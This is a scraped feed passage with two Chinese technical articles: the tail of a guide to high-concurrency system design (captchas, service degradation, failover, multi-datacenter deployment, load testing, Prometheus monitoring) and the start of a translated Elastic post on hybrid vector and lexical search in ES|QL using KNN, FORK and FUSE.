<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67e39f294d9c4a2db4afb6777a973187~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=nl%2BiaoAn%2BYfhuAmi6WfgFaNkUYs%3D" alt="" loading="lazy"/>
在高并发场景下，这种限制对于系统的稳定性是非常有必要的。但可能由于有些非法请求次数太多，达到了该接口的请求上限，而影响其他的正常用户访问该接口。看起来有点得不偿失。</p>
<h3 data-id="heading-19">13.4 加验证码</h3>
<p>相对于上面三种方式，加验证码的方式可能更精准一些，同样能限制用户的访问频次，但好处是不会存在误杀的情况。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbb83f986fed496189bb0b18c9e5a09d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=7s5MpOKkgYSzRO5XHNPNJl03C88%3D" alt="" loading="lazy"/>
通常情况下，用户在请求之前，需要先输入验证码。用户发起请求之后，服务端会去校验该验证码是否正确。只有正确才允许进行下一步操作，否则直接返回，并且提示验证码错误。</p>
<p>此外，验证码一般是一次性的，同一个验证码只允许使用一次，不允许重复使用。</p>
<p>普通验证码，由于生成的数字或者图案比较简单，可能会被破解。优点是生成速度比较快，缺点是有安全隐患。</p>
<p>还有一个验证码叫做：<code>移动滑块</code>，它生成速度比较慢，但比较安全，是目前各大互联网公司的首选。</p>
<h2 data-id="heading-20">14 服务降级</h2>
<p>前面已经说过，对于高并发系统，为了保证系统的稳定性，需要做限流。</p>
<p>但光做限流还不够。</p>
<p>我们需要合理利用服务器资源，保留核心的功能，将部分非核心的功能，我们可以选择屏蔽或者下线掉。</p>
<p>我们需要做<code>服务降级</code>。</p>
<p>我们在设计高并发系统时，可以预留一些服务降级的开关。</p>
<p>比如在秒杀系统中，核心的功能是商品的秒杀，对于商品的评论功能，可以暂时屏蔽掉。</p>
<p>在服务端的分布式配置中心，比如：apollo中，可以增加一个开关，配置是否展示评论功能，默认是true。</p>
<p>前端页面通过服务器的接口，获取到该配置参数。</p>
<p>如果需要暂时屏蔽商品评论功能，可以将apollo中的参数设置成false。</p>
<p>此外，我们在设计高并发系统时，还可以预留一些兜底方案。</p>
<p>比如某个分类查询接口，要从redis中获取分类数据，返回给用户。但如果那一条redis挂了，则查询数据失败。</p>
<p>这时候，我们可以增加一个兜底方案。</p>
<p>如果从redis中获取不到数据，则从apollo中获取一份默认的分类数据。</p>
<p>目前使用较多的熔断降级中间件是：<code>Hystrix</code> 和 <code>Sentinel</code>。</p>
<ul>
<li>Hystrix是Netflix开源的熔断降级组件。</li>
<li>Sentinel是阿里中间件团队开源的一款不光具有熔断降级功能，同时还支持系统负载保护的组件。</li>
</ul>
<p>二者的区别如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbb07cc10a2c4d3eb21f81f93dad0cad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=cURddcp4xRvln6JjDjniNXxrno4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-21">15 故障转移</h2>
<p>在高并发的系统当中，同一时间有大量的用户访问系统。</p>
<p>如果某一个应用服务器节点处于假死状态，比如CPU使用率100%了，用户的请求没办法及时处理，导致大量用户出现请求超时的情况。</p>
<p>如果这种情况下，不做任何处理，可能会影响系统中部分用户的正常使用。</p>
<p>这时我们需要建立<code>故障转移</code>机制。</p>
<p>当检测到经常接口超时，或者CPU打满，或者内存溢出的情况，能够自动重启那台服务器节点上的应用。</p>
<p>在SpringCloud微服务当中，可以使用<code>Ribbon</code>做负载均衡器。</p>
<p>Ribbon是Spring Cloud中的一个负载均衡器组件，它可以检测服务的可用性，并根据一定规则将请求分发至不同的服务节点。在使用Ribbon时，需要注意以下几个方面：</p>
<ol>
<li>设置请求超时时间，当请求超时时，Ribbon会自动将请求转发到其他可用的服务上。</li>
<li>设置服务的健康检查，Ribbon会自动检测服务的可用性，并将请求转发至可用的服务上。</li>
</ol>
<p>此外，还需要使用<code>Hystrix</code>做熔断处理。</p>
<p>Hystrix是SpringCloud中的一个熔断器组件，它可以自动地监测所有通过它调用的服务，并在服务出现故障时自动切换到备用服务。在使用Hystrix时，需要注意以下几个方面：</p>
<ol>
<li>设置断路器的阈值，当故障率超过一定阈值后，断路器会自动切换到备用服务上。</li>
<li>设置服务的超时时间，如果服务在指定的时间内无法返回结果，断路器会自动切换到备用服务上。到其他的能够正常使用的服务器节点上。</li>
</ol>
<h2 data-id="heading-22">16 异地多活</h2>
<p>有些高并发系统，为了保证系统的稳定性，不只部署在一个机房当中。</p>
<p>为了防止机房断电，或者某些不可逆的因素，比如：发生地震，导致机房挂了。</p>
<p>需要把系统部署到多个机房。</p>
<p>我们之前的游戏登录系统，就部署到了深圳、天津和成都，这三个机房。</p>
<p>这三个机房都有用户的流量，其中深圳机房占了40%，天津机房占了30%，成都机房占了30%。</p>
<p>如果其中的某个机房突然挂了，流量会被自动分配到另外两个机房当中，不会影响用户的正常使用。</p>
<p>这就需要使用<code>异地多活</code>架构了。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29cd6621cdcf4308942f1d86dad27c95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=GKaVZV5xjuHCzPSOOdY1nvDOHNg%3D" alt="" loading="lazy"/>
用户请求先经过第三方的DNS服务器解析，然后该用户请求到达路由服务器，部署在云服务器上。</p>
<p>路由服务器，根据一定的算法，会将该用户请求分配到具体的机房。</p>
<p>异地多活的难度是多个机房需要做数据同步，如何保证数据的一致性？</p>
<h2 data-id="heading-23">17 压测</h2>
<p>高并发系统，在上线之前，必须要做的一件事是做<code>压力测试</code>。</p>
<p>我们先要预估一下生产环境的请求量，然后对系统做压力测试，之后评估系统需要部署多少个服务器节点。</p>
<p>比如预估有10000的qps，一个服务器节点最大支持1000pqs，这样我们需要部署10个服务器节点。</p>
<p>但假如只部署10个服务器节点，万一突增了一些新的用户请求，服务器可能会扛不住压力。</p>
<p>因此，部署的服务器节点，需要把预估用户请求量的多一些，比如：按3倍的用户请求量来计算。</p>
<p>这样我们需要部署30个服务器节点。</p>
<p>压力测试的结果跟环境有关，在dev环境或者test环境，只能压测一个大概的趋势。</p>
<p>想要更真实的数据，我们需要在pre环境，或者跟生产环境相同配置的专门的压测环境中，进行压力测试。</p>
<p>目前市面上做压力测试的工具有很多，比如开源的有：Jemter、LoaderRunnder、Locust等等。</p>
<p>收费的有：阿里自研的云压测工具PTS。</p>
<h2 data-id="heading-24">18 监控</h2>
<p>为了出现系统或者SQL问题时，能够让我们及时发现，我们需要对系统做监控。</p>
<p>目前业界使用比较多的开源监控系统是：<code>Prometheus</code>。</p>
<p>它提供了 <code>监控</code> 和 <code>预警</code> 的功能。</p>
<p>架构图如下：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20b28d2952bc46b991dcbd729367bc77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=uK5xST77%2BjWsqs%2F1XyNmPurRfl0%3D" alt="" loading="lazy"/></p>
<p>我们可以用它监控如下信息：</p>
<ul>
<li>接口响应时间</li>
<li>调用第三方服务耗时</li>
<li>慢查询sql耗时</li>
<li>cpu使用情况</li>
<li>内存使用情况</li>
<li>磁盘使用情况</li>
<li>数据库使用情况</li>
</ul>
<p>等等。。。</p>
<p>它的界面大概长这样子：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e97451b35c524e19aa96568a66ee17c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=va3BvgRtpspk6XGg78NjJ6O1%2Fs8%3D" alt="" loading="lazy"/>
可以看到mysql当前qps，活跃线程数，连接数，缓存池的大小等信息。</p>
<p>如果发现数据量连接池占用太多，对接口的性能肯定会有影响。</p>
<p>这时可能是代码中开启了连接忘了关，或者并发量太大了导致的，需要做进一步排查和系统优化。</p>
<p>截图中只是它一小部分功能，如果你想了解更多功能，可以访问Prometheus的官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fprometheus.io%2F" target="_blank" title="https://prometheus.io/" ref="nofollow noopener noreferrer">prometheus.io/</a></p>
<p>其实，高并发的系统中，还需要考虑安全问题，比如：</p>
<ol>
<li>遇到用户不断变化ip刷接口怎办？</li>
<li>遇到用户大量访问缓存中不存在的数据，导致缓存雪崩怎么办？</li>
<li>如果用户发起ddos攻击怎么办？</li>
<li>用户并发量突增，导致服务器扛不住了，如何动态扩容？</li>
</ol>
<p>感兴趣的小伙伴可以找我私聊。</p>
<p>如果这篇文章对您有所帮助，或者有所启发的话，帮忙关注一下我的同名公众号：苏三说技术，您的支持是我坚持写作最大的动力。</p>
<p>求一键三连：点赞、转发、在看。</p>
<p>关注公众号：【苏三说技术】，在公众号中回复：进大厂，可以免费获取我最近整理的10万字的面试宝典，好多小伙伴靠这个宝典拿到了多家大厂的offer。</p>
<p>更多项目实战在我的技术博客：susan.net.cn/project</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在 ES|QL 中的混合搜索和多阶段检索]]></title>    <link>https://juejin.cn/post/7592912896591396883</link>    <guid>https://juejin.cn/post/7592912896591396883</guid>    <pubDate>2026-01-09T03:19:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592912896591396883" data-draft-id="7592887786966319140" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在 ES|QL 中的混合搜索和多阶段检索"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-01-09T03:19:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在 ES|QL 中的混合搜索和多阶段检索
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:19:04.000Z" title="Fri Jan 09 2026 03:19:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：来自 Elastic <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fioana-tagirta" title="https://www.elastic.co/search-labs/author/ioana-tagirta" target="_blank" ref="nofollow noopener noreferrer">Ioana Tagirta</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a19c9190184468ca51fb6615d85bc34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533548&amp;x-signature=9SRDnvJ6d7QvXuIEFwSs4BZmEW4%3D" alt="" loading="lazy"/></p>
<p>亲身体验 Elasticsearch：深入了解我们的<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch-labs%3Ftab%3Dreadme-ov-file" title="https://github.com/elastic/elasticsearch-labs?tab=readme-ov-file" target="_blank" ref="nofollow noopener noreferrer">示例 notebooks</a>，开始<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fcloud-trial-overview" title="https://www.elastic.co/cloud/cloud-trial-overview" target="_blank" ref="nofollow noopener noreferrer">免费的 cloud 试用</a>，或立即在<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143747798" title="https://elasticstack.blog.csdn.net/article/details/143747798" target="_blank" ref="nofollow noopener noreferrer">本地机器</a>上试用 Elastic。</p>
<hr/>
<p>在 Elasticsearch 9.2 中，我们引入了在 Elasticsearch Query Language（ ES|QL ）中进行密集 <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F145485873" title="https://elasticstack.blog.csdn.net/article/details/145485873" target="_blank" ref="nofollow noopener noreferrer">vector search</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F145697606" title="https://elasticstack.blog.csdn.net/article/details/145697606" target="_blank" ref="nofollow noopener noreferrer">hybrid search</a> 的能力。这延续了我们将 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fquery-filter%2Flanguages%2Fesql" title="https://www.elastic.co/docs/explore-analyze/query-filter/languages/esql" target="_blank" ref="nofollow noopener noreferrer">ES|QL</a> 打造成解决现代 search 用例的最佳 search 语言的投入。</p>
<h2 data-id="heading-0">多阶段检索：现代搜索的挑战</h2>
<p>现代搜索已经不再只是简单的关键词匹配。今天的搜索应用需要理解意图，处理自然语言，并结合多个排序信号来提供最佳结果。</p>
<p>最相关结果的检索是在多个阶段中完成的，每个阶段都会逐步细化结果集。过去并非如此，当时大多数用例只需要一到两个阶段的检索：一次初始查询来获取结果，以及一个可能的重新评分阶段。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83627cc18f12470a938737e74d7bfa39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533548&amp;x-signature=khVr2kt6jWy143GdhyvL42U5m%2Bs%3D" alt="" loading="lazy"/></p>
<p>我们从初始检索开始，在这一阶段我们广泛搜索以收集与我们查询相关的结果。由于需要筛选所有数据，我们应该使用能够快速返回结果的技术，即使在索引数十亿文档时也能高效。</p>
<p>因此，我们采用可靠的技术，例如 Elasticsearch 从一开始就支持并优化的词汇搜索，或者 Elasticsearch 在速度和准确性上表现出色的 vector search。</p>
<p>使用 BM25 的 lexical search 非常快，最适合精确的术语匹配或短语匹配，而 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Fvector" title="https://www.elastic.co/docs/solutions/search/vector" target="_blank" ref="nofollow noopener noreferrer">vector</a> 或 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Fsemantic-search" title="https://www.elastic.co/docs/solutions/search/semantic-search" target="_blank" ref="nofollow noopener noreferrer">semantic search</a> 更适合处理自然语言查询。<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F148668424" title="https://elasticstack.blog.csdn.net/article/details/148668424" target="_blank" ref="nofollow noopener noreferrer">Hybrid search</a> 将 lexical 和 vector search 结果结合起来，以发挥两者的优势。Hybrid search 解决的挑战在于 vector 和 lexical search 拥有完全不同且不兼容的评分函数，它们生成的值在不同区间，并遵循不同分布。vector search 得分接近 1 可能意味着非常匹配，但 lexical search 并非如此。<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fhybrid-search-elasticsearch" title="https://www.elastic.co/search-labs/blog/hybrid-search-elasticsearch" target="_blank" ref="nofollow noopener noreferrer">Hybrid search</a> 方法，如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Frest-apis%2Freciprocal-rank-fusion" title="https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion" target="_blank" ref="nofollow noopener noreferrer">reciprocal rank fusion (RRF)</a> 和 scores 的线性组合，会分配新的分数，将 lexical 和 vector search 的原始分数融合。</p>
<p>在 hybrid search 之后，我们可以使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Franking%2Fsemantic-reranking" title="https://www.elastic.co/docs/solutions/search/ranking/semantic-reranking" target="_blank" ref="nofollow noopener noreferrer">semantic reranking</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Franking%2Flearning-to-rank-ltr" title="https://www.elastic.co/docs/solutions/search/ranking/learning-to-rank-ltr" target="_blank" ref="nofollow noopener noreferrer">Learning To Rank (LTR)</a> 等技术，这些技术使用专门的 machine learning 模型对结果进行重新排序。</p>
<p>利用最相关的结果，我们可以使用 large language models (LLMs) 进一步丰富我们的响应，或在 <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153720860" title="https://elasticstack.blog.csdn.net/article/details/153720860" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder</a> 等工具的 agentic 工作流中，将最相关结果作为上下文传递给 LLMs。</p>
<p>ES|QL 能够处理检索的所有这些阶段。ES|QL 本身是一个管道语言，每条命令会转换输入并将输出发送到下一条命令。每个检索阶段由一个或多个连续的 ES|QL 命令表示。本文展示了 ES|QL 如何支持每个阶段。</p>
<h3 data-id="heading-1">Vector search - 向量搜索</h3>
<p>在 Elasticsearch 9.2 中，我们在 ES|QL 中引入了密集 vector search 的技术预览支持。这和调用 knn 函数一样简单，只需要一个 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fdense-vector" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/dense-vector" target="_blank" ref="nofollow noopener noreferrer">dense_vector</a> 字段和一个 query vector：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> <span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector)
<span class="hljs-number">3.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>

`AI写代码
</code></pre>
<p>此查询执行近似最近邻搜索，检索与 query_vector 最相似的 100 个文档。</p>
<h3 data-id="heading-2">混合搜索：Reciprocal rank fusion/RRF</h3>
<p>在 Elasticsearch 9.2 中，我们在 ES|QL 中引入了使用 RRF 和结果线性组合的 hybrid search 支持。</p>
<p>这允许将 vector search 和 lexical search 结果合并为单一的结果集。</p>
<p>要在 ES|QL 中实现这一点，我们需要使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffork" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fork" target="_blank" ref="nofollow noopener noreferrer">FORK</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffuse" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fuse" target="_blank" ref="nofollow noopener noreferrer">FUSE</a> 命令。<strong>FORK</strong> 可以运行多个执行分支，<strong>FUSE</strong> 则合并结果，并使用 RRF 或线性组合分配新的相关性分数。</p>
<p>在下面的示例中，我们使用 FORK 运行两个独立的分支，其中一个使用 match 函数进行 lexical search，另一个使用 knn 函数进行 vector search。然后我们使用 FUSE 将结果合并：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE <span class="hljs-operator">/</span><span class="hljs-operator">/</span> uses RRF <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AI写代码
</code></pre>
<p>让我们分解查询以更好地理解执行模型，首先来看 FORK 命令的输出：</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)

`AI写代码
</code></pre>
<p>FORK 命令输出来自两个分支的结果，并添加了一个 _fork 鉴别器列：</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>_fork</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.88</td><td>fork1</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.88</td><td>fork1</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.86</td><td>fork1</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.84</td><td>fork1</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.78</td><td>fork1</td></tr><tr><td>4144</td><td>The Children of Húrin</td><td>0.79</td><td>fork1</td></tr><tr><td>4001</td><td>The Hobbit</td><td>4.55</td><td>fork2</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>4.25</td><td>fork2</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>4.11</td><td>fork2</td></tr><tr><td>4005</td><td>The Two Towers</td><td>3.8</td><td>fork2</td></tr><tr><td>4006</td><td>The Return of the King</td><td>4.1</td><td>fork2</td></tr></tbody></table>
<p>正如你会注意到的，某些文档会出现两次，这就是我们随后使用 FUSE 来合并表示相同文档的行并分配新的相关性分数的原因。FUSE 分两阶段执行：</p>
<ul>
<li>对每一行，FUSE 根据所使用的 hybrid search 算法分配新的相关性分数。</li>
<li>表示相同文档的行会被合并，并计算新的分数。</li>
</ul>
